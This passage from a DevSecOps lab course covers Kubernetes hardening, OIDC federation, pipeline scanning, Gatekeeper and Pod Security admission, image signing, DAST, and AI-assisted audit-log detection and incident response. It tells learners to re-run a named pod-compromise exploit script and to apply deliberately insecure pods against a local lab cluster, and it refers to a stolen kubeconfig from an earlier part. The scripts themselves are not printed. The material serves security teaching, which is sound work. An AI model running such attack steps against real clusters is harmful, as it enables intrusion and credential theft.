**What you're doing:** switching from the insecure Part 1 deployment to the
hardened one, and re-running the A2 attack to watch it fail.

Compare `k8s/insecure/deployment.yaml` with `k8s/base/deployment.yaml`. The
hardened one: runs as a fixed non-root user, read-only root filesystem, drops
**all** capabilities, no privilege escalation, a seccomp profile, resource
limits, probes, a NetworkPolicy, and — crucially — `automountServiceAccount
Token: false`, so there is **no token in the pod** for an attacker to steal.

```bash
make deploy ENV=dev            # now deploys k8s/overlays/dev (the hardened set)
# re-run A2 against it:
attack/a2-pod-compromise/exploit.sh ~/.kube/config dev
```

`make deploy` deploys the app **by digest** (the exact image fingerprint, not a
movable tag). If the image for your current commit isn't built yet, it builds
and pushes it first, so this works on its own.

A2 now stalls: `id` shows a non-root user, there is no SA token to read, the
root filesystem is read-only. **Defence in depth** — several small limits, each
removing one of the attacker's moves.

---

## Lab 12 — Replace the stolen-able kubeconfig with OIDC federation  *(closes A1's prize)*

**What you're doing:** removing the thing A1 stole. **OIDC federation** means the
cluster trusts GitHub's identity provider directly, so your pipeline proves who
it is with a **short-lived token** instead of a stored admin kubeconfig.

```bash
make oidc REPO=<your-gh-user>/practice-lab-<name>
```

Read what it did (`platform/oidc.sh`, `platform/auth/auth-config.yaml.tpl`):
the API server now validates a GitHub-signed JWT (a signed token), checks it was
minted for this cluster, that it comes from **your** repo on **main** bound to
the **dev** or **prod** environment, and maps it to a Kubernetes user with a
**least-privilege** Role (`platform/rbac/ci-deployer.yaml.tpl`) in that one
namespace. A `dev` token cannot touch `prod`.

Publish the (public, non-secret) connection details as repo variables so the
pipeline can find the cluster:

```bash
make oidc-vars           # sets KIND_API_SERVER, KIND_AUDIENCE, KIND_CA_DATA
```

There is now **no cluster credential to steal** — tokens live for minutes and
only work from your pipeline. Delete the old secret:

```bash
gh secret delete KUBECONFIG_ADMIN
```

---

## Lab 13 — Remove the injection, fix the input handling  *(closes A1)*

**What you're doing:** deleting the vulnerable ChatOps workflow. The fixed
pipeline never needs a pattern like it.

```bash
git rm .github/workflows/90-chatops-vulnerable.yml
git commit -m "remove vulnerable chatops bot"
```

The rule it broke: **never interpolate untrusted input (`${{ github.event.*
}}`) into a shell**. Pass it through `env:` instead, where the shell treats it
as data, not code. The secure workflows waiting in `ci/workflows/20-ci.yml` and
`21-cd.yml` do exactly this.

---

## Lab 14 — Turn on the scans and secure the pipeline itself

**What you're doing:** running every static security gate on your laptop, then
replacing the insecure pipeline with the secure one that runs those same gates
on every push.

```bash
make scan            # gitleaks (secrets) + semgrep/bandit (SAST) + trivy (SCA) + hadolint/trivy/conftest (IaC & policy)
make policy-test     # unit tests for the OPA policies
make scan-workflows  # actionlint + zizmor on the workflows themselves
```

What you're seeing: `make scan` runs four kinds of check in order — **secrets**
(Gitleaks), **code** (Semgrep/Bandit), **dependencies** (Trivy), and
**manifests/Dockerfile** (Hadolint/Trivy/Conftest). On the hardened code they
all pass. `scan-workflows` checks the workflow files themselves and flags the
**insecure** Part 1 pipeline (unpinned actions, over-broad token).

Now replace the insecure pipeline. The secure `20-ci.yml` runs all these gates
on every push and PR, and `21-cd.yml` deploys over OIDC by digest:

```bash
git rm .github/workflows/10-ci-insecure.yml
cp ci/workflows/20-ci.yml ci/workflows/21-cd.yml .github/workflows/
git add .github/workflows/
git commit -m "secure CI/CD: scans + OIDC deploy"
git push
gh run watch
```

Notice the secure workflows **pin actions to a commit SHA**, use a
**read-only** default token, request `id-token: write` only where needed, and
set `persist-credentials: false`.

---

## Lab 15 — Enforce Pod Security  *(closes A2 for any pod)*

**What you're doing:** telling the cluster to refuse insecure pods *at
admission* — before they ever run — using Kubernetes' built-in **Pod Security**
standard, cluster-wide.

```bash
platform/psa-restricted.sh                                       # labels dev/prod "restricted"
kubectl --context kind-devsecops -n dev apply -f k8s/insecure/   # now rejected
```

The second command tries to apply the insecure Part 1 manifest again. You'll see
a **PodSecurity "restricted" violation** listing exactly what's wrong
(`runAsNonRoot`, `allowPrivilegeEscalation`, capabilities, seccomp). The pod no
longer fits — which is the point. (The hardened deployment still runs fine.)

---

## Lab 16 — Admission policy with OPA Gatekeeper  *(closes A2 rogue pods, A3)*

**What you're doing:** adding **Gatekeeper**, a policy engine that inspects every
resource as it's created and denies the ones that break your rules. Pod Security
covers the pod; Gatekeeper covers everything else — where images may come from,
no `:latest`, required limits, and (in prod) **digests only**, so nobody can
`kubectl set image ...:hotfix` around the pipeline (A3).

```bash
make gatekeeper
# try the hand-made "hotfixes" Gatekeeper should refuse:
kubectl --context kind-devsecops -n dev  apply -f platform/gatekeeper/examples/sneaky-pod.yaml
kubectl --context kind-devsecops -n prod apply -f platform/gatekeeper/examples/hotfix-by-tag.yaml
```

Both are **denied**, with the policy id in the message — e.g. `[only-local-registry]`,
`[no-latest-tag]`, `[require-limits]` for the sneaky pod, and `[prod-digest-only]`
for the tag hotfix. The same rules run **shift-left** in CI via `conftest`
(`make scan-iac`), so a bad manifest fails the PR long before admission.

---

## Lab 16b — Measure against the standards: Kubescape + CIS benchmark

**What you're doing:** Conftest and Gatekeeper enforce **your** rules. Now you
measure against **industry standards** — the gap you can't see is the one that
gets you. A *benchmark* scores you against a published security standard.

**Kubescape — scan the manifests (shift-left, no cluster):**

```bash
make scan-config        # k8s/base against the NSA-CISA + MITRE frameworks
```

The hardened base passes. Now watch the insecure Part 1 manifest fail the same
frameworks:

```bash
docker run --rm -v "$PWD:/src" -w /src quay.io/kubescape/kubescape-cli:v4.0.21 \
  scan framework nsa,mitre k8s/insecure --format pretty-printer
```

This is what Kubescape adds over conftest: findings mapped to **NSA-CISA**
hardening guidance and **MITRE ATT&CK** techniques, not just pass/fail. It runs
in CI (`20-ci.yml`), so a weak manifest fails the PR.

**kube-bench — benchmark the running cluster (CIS):**

```bash
make cis                # runs kube-bench as a Job against the kind node
```

You'll see `[PASS]`, `[WARN]` and `[FAIL]` lines against the **CIS Kubernetes
Benchmark** (and a summary like "65 checks PASS, 11 FAIL, 55 WARN"). kind is a
developer cluster, not a hardened distribution, so there are real FAILs — that
is the lesson. A benchmark measures the distance between what you run and the
standard. Read `reports/kube-bench.txt` and pick three findings you'd fix on a
production cluster.

---

## Lab 17 — Sign and verify images  *(closes A3)*

**What you're doing:** making images tamper-evident. **cosign** cryptographically
**signs** each image, tying it to your repo's GitHub identity; the deploy step
**verifies** that signature first. An unsigned or foreign image (like A3's
backdoor) fails verification and never reaches the cluster.

CI signs by digest (`ci/sign.sh`) and CD verifies before deploying
(`ci/verify.sh`). "Keyless" means there's no private key to manage — cosign uses
a short-lived certificate tied to the workflow's identity. Locally you can just
confirm the tool is present (real signing needs the pipeline + internet):

```bash
# (runs in CI; to try locally you need cosign + internet for Fulcio/Rekor)
cosign version
```

---

## Lab 17b — Dynamic scan the running app (DAST)

**What you're doing:** scanning the *running* app from the outside. Every scan so
far was **static** (it read code, manifests, the image). **DAST** (Dynamic
Application Security Testing) is different: **OWASP ZAP** drives the live app
over HTTP, like an attacker with no source access, and reports what it finds
(missing security headers, exposed endpoints, injection responses).

```bash
make build push
make deploy ENV=dev          # hardened, deploy-by-digest
make dast ENV=dev            # OWASP ZAP baseline against the app in dev
```

ZAP crawls the service in the cluster and writes `reports/zap-report.html`
(open it in a browser). It takes a few minutes. Because Part 3 hardened the app
(security headers, locked-down responses), the baseline comes back **clean** —
compare that to running it against the Part 1 app. DAST is the complement to
SAST: static scanning proves the code *looks* right, DAST proves the deployed
app *behaves* right.

> Static (SAST/SCA/IaC/config) → build → sign → admission → **DAST on the live
> app** → detection. Each layer sees something the others can't.

---

### What you built: security-first architecture

| Attack (Part 2) | Control (Part 3) | Lab |
|-----------------|------------------|-----|
| A1 injection | env-pass input, pinned actions, least-priv token | 13, 14 |
| A1 stolen kubeconfig | OIDC federation, short-lived scoped tokens | 12 |
| A2 pod takeover | non-root, read-only FS, no SA token, tight RBAC | 11 |
| A2 any insecure pod | Pod Security `restricted` | 15 |
| A2 bad deploy by hand | Gatekeeper admission + conftest shift-left | 16 |
| A3 image swap | deploy by digest, cosign sign + verify | 16, 17 |
| gap vs. standards | Kubescape (NSA/MITRE) + kube-bench (CIS Benchmark) | 16b |
| vulnerable running app | OWASP ZAP dynamic scan (DAST) | 17b |

→ Continue to **`labs/part4.md`** to catch the next attempt.


---

# Part 4 — Detect & respond, with AI (AIOps)

Prevention fails eventually. This part is about **knowing** when it does, and
using an LLM (a large language model — here, Claude) to turn raw signals into
something a human can act on fast. "AIOps" = using AI to help operate and
defend a system.

**Where the signals come from** — three sources, all already running:

- the **Kubernetes API audit log** — a record of every action taken against the
  cluster (wired up by `make up`);
- **Gatekeeper audit** — the policy violations Gatekeeper sees;
- the **scanners** from Part 3 — their findings (in a format called **SARIF**).

And three AI tools (in `ai/`) that read those signals. They use Claude
(`claude-opus-5-5`); set `ANTHROPIC_API_KEY` or run `ant auth login`. **Without a
key they print the exact prompt they *would* send**, so you can still follow
along and see the inputs — you just don't get the generated answer.

---

## Lab 18 — Detect the attack in the audit log

**What you're doing:** generating some attacker activity, then turning the raw
audit log into a short list of ranked findings.

```bash
# generate some signal (either works):
kubectl --context kind-devsecops -n dev exec deploy/kubenotes -- id || true
attack/a2-pod-compromise/exploit.sh ~/.kube/config dev   # most steps now fail — that's the point

make audit        # the raw audit log tail
make detect       # detect/detect.py turns it into ranked findings
cat detect/findings.json
```

- The first commands *do something* the cluster records (open a shell in a pod;
  run the A2 attack — which mostly fails now, which is the point).
- `make audit` shows the raw log (dense JSON).
- `make detect` runs a small Python program that reads that log and flags the
  attacker's exact moves.

`detect/detect.py` flags: a shell opened in a pod (`RUNTIME-EXEC`), Secret reads
(`SECRET-ACCESS`), rogue pod creation, RBAC changes, and a pipeline identity
acting in the **wrong environment** (`OIDC-CROSS-ENV`). Items that are just RBAC
correctly **denying** the attacker show up as `INFO` — your Part 3 controls,
working, on the record.

---

## Lab 19 — AI incident response

**What you're doing:** handing those findings to an AI "incident doctor" that
writes a real incident report — summary, timeline, blast radius, containment
commands, and the one control that would have prevented it.

```bash
make incident                 # detect + AI report to your terminal
make incident ALERT=--alert   # also open a GitHub issue (and Slack if SLACK_WEBHOOK_URL is set)
```

Without an API key you'll see the exact prompt (the findings + instructions)
that *would* be sent — useful for understanding what the AI is reasoning over.

---

## Lab 20 — AI build doctor

**What you're doing:** when a CI build fails, instead of reading 500 log lines,
you get an AI diagnosis. `30-ai-build-doctor.yml` runs on any CI failure and
posts a root-cause + fix comment. Try it locally against any failing log:

```bash
make scan 2>&1 | tee reports/build.log    # (fails if a scanner finds something)
make ai-doctor LOG=reports/build.log
```

- `make scan 2>&1 | tee reports/build.log` runs the scans and saves their output
  to a log file (`tee` both shows and saves it).
- `make ai-doctor LOG=...` feeds that log to the AI.

It names the failing step, the root cause, a copy-pasteable fix, and one change
to stop it recurring — and if the failure is a **scanner doing its job**, it
says so: fix the code, not the gate.

To wire it into GitHub, turn the workflow on and add the key as a secret:

```bash
cp ci/workflows/30-ai-build-doctor.yml .github/workflows/
git add .github/workflows/30-ai-build-doctor.yml
git commit -m "AI build doctor" && git push
gh secret set ANTHROPIC_API_KEY
```

---

## Lab 21 — AI security triage

**What you're doing:** turning a wall of scanner output into a ranked,
deduplicated fix list — judged by real exploitability, not just raw severity, so
you fix what actually matters first.

```bash
make scan
make triage
```

---

## Lab 22 (optional, advanced) — runtime detection with Falco

**What you're doing (optional):** adding a second pair of eyes. The audit log
sees the **API**; [Falco](https://falco.org) sees **syscalls** inside containers
— a shell spawning, a sensitive file read, an outbound connection a miner makes
— even when nothing touches the API. See `detect/falco/README.md`. Falco needs a
Linux kernel path (eBPF); on Docker Desktop it can be finicky, which is why the
audit-log detector above is the lab's dependable core.

---

### What you built: AIOps

- **Detection** from audit logs + admission + scanners, ranked by a simple rule engine.
- **Response**: an LLM that explains failures and incidents and alerts the right channel.
- **The full loop**: build → attack → govern → **detect → respond** — and back to a fix.

### Go back and measure yourself

Re-run all three Part 2 attacks against the finished platform:

- A1 injection → `scan-workflows` blocks the workflow; there's no kubeconfig to steal (OIDC).
- A2 pod takeover → non-root + no token + Pod Security + Gatekeeper stop it; the audit log + AI catch the attempt.
- A3 image swap → digest + signature verification + Gatekeeper refuse it.

That gap — between Part 1 and now — is the whole course.


---

# Appendix — troubleshooting, scenarios & glossary

## 7. When it doesn't work (the playbook)

This is normal. Work through it calmly — it is part of the learning.

**First, always try these three:**
```bash
make status                 # what's actually running right now
make down && make up        # the universal reset; fixes most cluster weirdness
docker ps                   # is Docker even running? is the registry up?
```

**Common issues:**

| Symptom | Likely cause | Fix |
|---------|-------------|-----|
| `cannot connect to the Docker daemon` | Docker isn't running | start Docker Desktop / the engine, retry |
| `make up` hangs or the cluster is unhealthy | low memory | free up RAM (~8 GB), `make down && make up` |
| `kind: command not found` | tool not on PATH | re-run the install step for that tool |
| a scanner "fails" | **often correct!** it found a real issue | read what it reported before assuming it's broken |
| `make scan-workflows` fails | **by design** — it flags the deliberately-insecure Part 1 workflow | expected; not a regression |
| GitHub Actions won't run | workflows must be at the repo **root** | you ran `new-lab-repo.sh`? work inside `~/practice-lab-<name>`, not the subfolder |
| the AI labs do nothing | no `ANTHROPIC_API_KEY` | expected — they print the prompt instead; set the key to see answers |
| pod stuck / weird cluster state | drifted between parts | `make down && make up` restores the baseline |

**Golden rule:** a scanner or a policy **refusing** something is usually it
working, not failing. Read the message. In this course, "it blocked me" is
frequently the lesson.

Still stuck after the three resets? Note the exact command and the exact error,
and check that part's lab file — most steps have a "what this did" explanation
right after them.

---

## 8. Keep track of your progress

Tick these off as you go:

- [ ] **Setup** — all six tools print a version; `gh auth status` is logged in
- [ ] **Project** — `make up` done; `make status` shows ✔; pushed to your repo
- [ ] **Part 1** — a push auto-deploys; `curl localhost:8080/version` answers
- [ ] **Part 2** — stolen kubeconfig in `attack/loot/`; ran `attack/reset.sh`
- [ ] **Part 3** — `make scan` green; Gatekeeper denies insecure; digest deploy serves
- [ ] **Part 4** — attack re-run is flagged in `detect/findings.json`; incident report produced
- [ ] **Scenarios** — completed at least 3 of the 10 case studies
- [ ] **Tear down** — `make down` when finished

---

## 9. After the labs — the 10 case scenarios

Once you've finished the parts, `scenarios/` has ten short, self-contained
stories that follow one shape:

> **Story → Break** (introduce a real problem) **→ Observe → Which tool catches
> it → Fix → Why it matters**

They're how you *practise*: not "here is a control" but "here's a Tuesday,
something is wrong, go find it." Each is reversible (a `reset` /
`git checkout` restores the repo). Examples: a key committed to git (Gitleaks),
a `:latest` 2 a.m. hotfix (Gatekeeper + digests), a leaked kubeconfig (OIDC +
RBAC), an unsigned image (cosign verify), a shell in a pod (audit log + AI).

See [`scenarios/README.md`](scenarios/README.md) for the full list.

---

## 10. Mini-glossary (for the brand-new)

- **Container** — a packaged app + its dependencies that runs the same
  everywhere. Docker runs them.
- **Kubernetes (k8s)** — software that runs and manages many containers across
  machines. **kind** is a tiny Kubernetes running inside Docker on your laptop.
- **Pod** — the smallest unit Kubernetes runs; think "one running instance of
  your app."
- **Registry** — storage for built container images. You run one locally at
  `localhost:5001`.
- **CI/CD** — Continuous Integration / Continuous Delivery: automatically test,
  build, and deploy on every code change.
- **CI == local** — every pipeline step here is a `make` target that runs the
  same container on your laptop and in GitHub Actions, so "green locally" means
  "green in CI."
- **Shift-left** — run security checks early (on the code / in the PR) instead
  of after deploy.
- **OIDC federation** — GitHub proves its identity to the cluster and gets a
  **short-lived** token, so there's no long-lived password to steal.
- **Admission control** — the cluster inspecting and allowing/denying what you
  try to deploy (Pod Security, OPA Gatekeeper).
- **SBOM** — a Software Bill of Materials: a list of everything inside your
  image.
- **DAST** — Dynamic Application Security Testing: scanning the app while it's
  *running* (OWASP ZAP).

---

Ready? Go to **Section 3**, then open **[`labs/part1.md`](labs/part1.md)** and
start building. Take your time, read the "what this did" notes, and don't skip
the attacks — they're what make the defenses make sense.
